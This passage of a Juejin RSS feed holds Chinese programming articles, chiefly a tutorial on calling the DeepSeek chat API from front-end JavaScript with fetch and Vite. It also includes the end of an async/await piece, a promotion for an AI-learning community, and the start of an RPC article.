const <span class="hljs-selector-tag">a</span> = await <span class="hljs-built_in">fetch</span>(url1);
const <span class="hljs-selector-tag">b</span> = await <span class="hljs-built_in">fetch</span>(url2);

<span class="hljs-comment">// ✅ 高效：并行执行</span>
const <span class="hljs-selector-attr">[res1, res2]</span> = await Promise<span class="hljs-selector-class">.all</span>([fetch(url1), <span class="hljs-built_in">fetch</span>(url2)]);
</code></pre>
<hr/>
<h3 data-id="heading-8">结语</h3>
<p>从回调函数到 Promise，再到 <code>async/await</code>，JavaScript 的异步编程模型不断演进，目标始终是：<strong>让异步代码更简洁、更安全、更易维护</strong>。如今，<code>async/await</code> 已成为现代前端和 Node.js 开发的标配。掌握它，不仅能提升开发效率，也能写出更具可读性和健壮性的代码。</p>
<blockquote>
<p>正如那句老话所说：“异步不可怕，可怕的是写得像同步却不是同步。”而 <code>async/await</code>，正是让异步“看起来像同步”的最佳实践。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[人人都能学AI，人人都要学AI]]></title>    <link>https://juejin.cn/post/7575106644499251234</link>    <guid>https://juejin.cn/post/7575106644499251234</guid>    <pubDate>2025-11-23T09:00:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644499251234" data-draft-id="7575162322240045056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="人人都能学AI，人人都要学AI"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2025-11-23T09:00:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="袁庭新"/> <meta itemprop="url" content="https://juejin.cn/user/1207714136735408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            人人都能学AI，人人都要学AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1207714136735408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    袁庭新
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:00:37.000Z" title="Sun Nov 23 2025 09:00:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是袁庭新。很多朋友想借助AI来赋能自己，但苦于不知从何学起，又世面上的学习资料鱼龙混杂，怕误了时间；为此呢，我专门创建了一个AI技术学习的知识星球，星球里有海量的成体系的学习资料供大家学习。</p>
<p><strong>1、星球介绍</strong></p>
<p>知识星球「人人都要学AI」是由袁庭新发起的一站式AI学习社群。涵盖文案写作、PPT制作、数据分析、思维导图、会议纪要、视频生成、生活、教育、创业、政务、法律、投研、科研、自媒体、智能体、软件开发、等50余高频工作场景，100+提示词开箱即用。社群内每月设大咖直播答疑，支持全天候互动交流，致力于为职场人、学生党、创业者等不同群体，搭建从理论认知到实践落地的全链路成长平台，助你系统掌握AI知识与技能，拥抱数字化时代的核心竞争力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e97d401987143fcb3681f7aeaa05ce4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764493237&amp;x-signature=cQTmfuY4htKGFFMY8lDC%2Fz2wnWs%3D" alt="" loading="lazy"/></p>
<p><strong>2、星球亮点</strong></p>
<p>（1）AI行业信息：快速掌握AI领域最新动态，深度解读关键事件与行业趋势，助你始终站在技术前沿。</p>
<p>（2）AI专业知识：定期分享AI工具实操、应用教程、案例解析及开源项目，构建系统化知识体系。</p>
<p>（3）资料库共享：每周更新AI研报、政策解读、工具教材及案例资料，星友可免费下载学习。</p>
<p>（4）实战项目：提供保姆级教程、教练带队指导与社群答疑支持。</p>
<p>（5）人脉链接：联结志同道合的AI学习者，通过交流探讨实现经验共享与共同成长。</p>
<p>（6）社群陪伴：星球配有专属微信群，不定期邀请嘉宾分享，还方便寻找同频伙伴一起进步。</p>
<p>（7）专家答疑：星主与嘉宾会在社群和直播间里答疑，帮助大家解决日常工作中遇到的AI应用相关问题。</p>
<p>（8）资源对接：联通行业专家、合作伙伴与投资者，助力获取AI领域所需资源。</p>
<p>（9）副业变现：借助AI技术探索绘画、视频、数字人、智能体等变现路径，实现个人创富目标。</p>
<p>（10）社群共创：不仅有AI读报时间，学员还可以分享学习笔记、AI实操案例，探索AI变现项目，促进知识的交流与合作。</p>
<p>（11）岗位内推：为星球成员提供来自知名企业的内推机会，涵盖互联网、人工智能、科技等热门领域的招聘岗位，助力精准求职。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7136b2e4031e44dab9866bfc7ba7574e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKB5bqt5paw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764493237&amp;x-signature=MpfHrWg3zXan07uiVQPEDPCqoeA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端直连大模型：用原生 JavaScript 调用 DeepSeek API]]></title>    <link>https://juejin.cn/post/7575133880436326451</link>    <guid>https://juejin.cn/post/7575133880436326451</guid>    <pubDate>2025-11-23T08:34:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880436326451" data-draft-id="7575119254313861146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端直连大模型：用原生 JavaScript 调用 DeepSeek API"/> <meta itemprop="keywords" content="JavaScript,DeepSeek"/> <meta itemprop="datePublished" content="2025-11-23T08:34:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Zyx2007"/> <meta itemprop="url" content="https://juejin.cn/user/3924597867554890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端直连大模型：用原生 JavaScript 调用 DeepSeek API
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3924597867554890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Zyx2007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:34:10.000Z" title="Sun Nov 23 2025 08:34:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 AI 应用快速普及的今天，大语言模型（LLM）不再只是后端服务的专属能力。通过标准的 HTTP 接口，前端应用也能直接与模型对话——无需中间服务器，只需一个 API Key 和几行代码。本文将带你从零开始，使用原生 HTML/JavaScript 搭建一个能调用 DeepSeek 大模型的前端项目，并深入解析如何安全、规范地发起复杂请求。</p>
<h2 data-id="heading-0">项目初始化：选择合适的开发脚手架</h2>
<p>虽然纯 HTML 文件足以完成基础调用，但现代前端开发更推荐使用工程化工具提升效率。Vite 是目前最轻量且功能强大的全栈脚手架之一，支持 TypeScript、环境变量、热更新等特性。</p>
<p>首先，初始化一个 Vite 项目：</p>
<pre><code class="hljs language-perl" lang="perl">npm create vite@latest <span class="hljs-keyword">my</span>-llm-app -- --template vanilla
cd <span class="hljs-keyword">my</span>-llm-app
npm install
</code></pre>
<p>这会创建一个基于原生 JavaScript 的项目结构，包含 <code>index.html</code> 和 <code>main.js</code>，非常适合快速集成 LLM 调用逻辑。</p>
<h2 data-id="heading-1">理解 LLM 的 HTTP 调用协议</h2>
<p>大模型 API 本质上是一个标准的 RESTful 服务。以 DeepSeek 为例，其聊天接口地址为：</p>
<pre><code class="hljs language-bash" lang="bash">https://api.deepseek.com/v1/chat/completions
</code></pre>
<p>调用它需要构造一个符合要求的 <strong>POST 请求</strong>，包含三个关键部分：</p>
<h3 data-id="heading-2">1. 请求行（Request Line）</h3>
<ul>
<li>方法：<code>POST</code></li>
<li>URL：完整接口地址</li>
<li>协议版本：HTTP/1.1（由浏览器自动处理）</li>
</ul>
<h3 data-id="heading-3">2. 请求头（Headers）</h3>
<p>必须包含两项：</p>
<ul>
<li><code>Content-Type: application/json</code>：声明请求体为 JSON 格式</li>
<li><code>Authorization: Bearer &lt;your-api-key&gt;</code>：身份认证令牌</li>
</ul>
<h3 data-id="heading-4">3. 请求体（Body）</h3>
<ul>
<li>必须是字符串，不能直接传 JavaScript 对象</li>
<li>需用 <code>JSON.stringify()</code> 序列化</li>
<li>包含模型名称、消息历史等参数</li>
</ul>
<h2 data-id="heading-5">前端代码实现：用 fetch 发起请求</h2>
<p>下面是在 <code>main.js</code> 中封装的调用函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 从环境变量读取 API Key（Vite 支持 .env 文件）</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_KEY</span> = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_DEEPSEEK_API_KEY</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = <span class="hljs-string">'https://api.deepseek.com/v1/chat/completions'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">askDeepSeek</span>(<span class="hljs-params">messages</span>) {
  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-reasoner'</span>,
    <span class="hljs-attr">messages</span>: messages,
    <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">500</span>
  };

  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-variable constant_">API_URL</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${API_KEY}</span>`</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
  });

  <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
  }

  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
  <span class="hljs-keyword">return</span> data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
}
</code></pre>
<h3 data-id="heading-6">关键点解析：</h3>
<ul>
<li>
<p><strong><code>import.meta.env</code></strong>：Vite 提供的环境变量读取方式。需在项目根目录创建 <code>.env</code> 文件：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxxxxxxxxxxxxxx
</code></pre>
<blockquote>
<p>注意：Vite 要求环境变量必须以 <code>VITE_</code> 开头才能在前端暴露，这是安全机制。</p>
</blockquote>
</li>
<li>
<p><strong><code>await fetch</code></strong>：相比 <code>.then()</code> 链式调用，<code>async/await</code> 语法更接近同步代码，逻辑清晰易读。</p>
</li>
<li>
<p><strong>错误处理</strong>：检查 <code>response.ok</code> 可捕获 4xx/5xx 错误，避免解析失败的 JSON。</p>
</li>
</ul>
<h2 data-id="heading-7">在页面中使用</h2>
<p>在 <code>index.html</code> 中添加简单交互：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AI 助手<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"question"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入问题..."</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"handleAsk()"</span>&gt;</span>提问<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"answer"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleAsk</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'question'</span>);
      <span class="hljs-keyword">const</span> answerDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'answer'</span>);
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">askDeepSeek</span>([
          { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: input.<span class="hljs-property">value</span> }
        ]);
        answerDiv.<span class="hljs-property">textContent</span> = response;
      } <span class="hljs-keyword">catch</span> (err) {
        answerDiv.<span class="hljs-property">textContent</span> = <span class="hljs-string">'请求失败：'</span> + err.<span class="hljs-property">message</span>;
      }
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>这里通过内联 <code>&lt;script&gt;</code> 调用模块化的 <code>askDeepSeek</code> 函数，实现了从用户输入到 AI 回答的完整流程。</p>
<h2 data-id="heading-8">安全提醒：前端暴露 API Key 的风险</h2>
<p>必须明确：<strong>将 API Key 写在前端代码中存在泄露风险</strong>。任何访问你网页的用户都能通过开发者工具查看该密钥。因此，这种方式仅适用于：</p>
<ul>
<li>个人测试项目</li>
<li>密钥有严格用量限制</li>
<li>使用了 API 平台的域名白名单或 Referer 限制</li>
</ul>
<p>对于生产环境，强烈建议通过自己的后端代理请求，由服务器保管密钥。</p>
<h2 data-id="heading-9">总结</h2>
<p>通过原生 fetch API，前端可以直接与大模型服务通信，实现低延迟的智能交互。结合 Vite 的工程化能力，我们不仅能高效开发，还能通过环境变量管理敏感信息。虽然存在安全限制，但在可控场景下，这种“前端直连 LLM”的模式极大简化了 AI 应用的构建流程——从一行 HTML 到智能对话，不过百行代码的距离。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入浅出谈谈RPC框架]]></title>    <link>https://juejin.cn/post/7575104251865890826</link>    <guid>https://juejin.cn/post/7575104251865890826</guid>    <pubDate>2025-11-22T16:11:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865890826" data-draft-id="7575083657994223643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入浅出谈谈RPC框架"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-22T16:11:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XUN4J"/> <meta itemprop="url" content="https://juejin.cn/user/4179664935335515"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入浅出谈谈RPC框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4179664935335515/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    XUN4J
